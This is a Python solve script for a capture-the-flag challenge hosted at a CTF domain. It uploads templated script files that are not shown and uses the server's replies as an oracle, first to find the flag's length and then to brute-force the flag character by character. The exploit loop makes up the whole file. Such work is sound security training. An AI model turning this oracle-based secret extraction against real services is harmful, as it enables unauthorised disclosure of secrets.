from logging import raiseExceptions
import requests
import string
BASE_URL="https://pyscript.ctf.zoolab.org/"
flgl_tpl = ""
with open('get_flgl.py', 'r') as fp:
    flgl_tpl = fp.read()

search_tpl = ""
with open('searcher.py', 'r') as fp:
    search_tpl = fp.read()


def guess_flag_len(flgl:int)->bool:
    with requests.post(f"{BASE_URL}", files={'file': flgl_tpl.replace("48763", str(flgl)).encode()}) as resp:
        return resp.text.startswith("Here is your Flag")

def check_char(idx:int, ch:str)->bool:
    with requests.post(f"{BASE_URL}", files={'file': search_tpl.replace("48763", str(idx)).replace("@", ch).encode()}) as resp:
        return resp.text[0] == "H"

def main():
    sec_flg_len = 0
    for i in range(100):
        print(f"guessing flag len ... {i}")
        if guess_flag_len(i):
            sec_flg_len = i
            break
    print(f"sec_flg_len:{sec_flg_len}")
    flag = ""
    for idx in range(sec_flg_len):
        for c in string.printable:
            print(f"\rcurrent flag: {flag+c}", end="")
            if check_char(idx, '\\x' + hex(ord(c))[2:]):
                flag += c
                print(f"\rcurrent flag: {flag}")
                break
        else:
            raise Exception("wtf...")


if __name__ == "__main__":
    main()